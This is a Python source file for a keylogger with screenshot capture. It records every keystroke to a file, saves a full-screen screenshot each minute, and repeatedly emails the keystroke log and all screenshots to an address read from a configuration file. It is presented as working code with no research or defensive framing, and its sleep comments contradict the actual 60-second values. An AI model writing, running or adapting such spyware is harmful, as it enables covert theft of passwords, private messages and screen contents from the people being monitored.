import threading
import time
import os
import json
from pynput import keyboard
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Load email configuration
with open('config/email_config.json') as config_file:
    config = json.load(config_file)

def on_press(key):
    try:
        with open("keystrokes.txt", "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open("keystrokes.txt", "a") as f:
            f.write(f'{key}')

def capture_screenshot():
    if not os.path.exists('screenshots'):
        os.makedirs('screenshots')
    while True:
        screenshot = ImageGrab.grab()
        screenshot.save(f'screenshots/screenshot_{time.strftime("%Y%m%d-%H%M%S")}.png')
        time.sleep(60)  # Wait 5 (300) minutes

def send_email():
    while True:
        msg = MIMEMultipart()
        msg['From'] = config['sender_email']
        msg['To'] = config['receiver_email']
        msg['Subject'] = 'Logged Data'

        # Attach keystroke file
        if os.path.exists('keystrokes.txt'):
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open('keystrokes.txt', 'rb').read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="keystrokes.txt"')
            msg.attach(part)

        # Attach screenshots
        for screenshot in os.listdir('screenshots'):
            if screenshot.startswith('screenshot_'):
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(open(f'screenshots/{screenshot}', 'rb').read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename="{screenshot}"')
                msg.attach(part)

        with smtplib.SMTP(config['smtp_server'], config['smtp_port']) as server:
            server.starttls()
            server.login(config['sender_email'], config['password'])
            server.sendmail(config['sender_email'], config['receiver_email'], msg.as_string())

        time.sleep(60)  # Wait 1 (3600) hour

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    screenshot_thread = threading.Thread(target=capture_screenshot)
    screenshot_thread.start()

    email_thread = threading.Thread(target=send_email)
    email_thread.start()

    listener.join()
    screenshot_thread.join()
    email_thread.join()
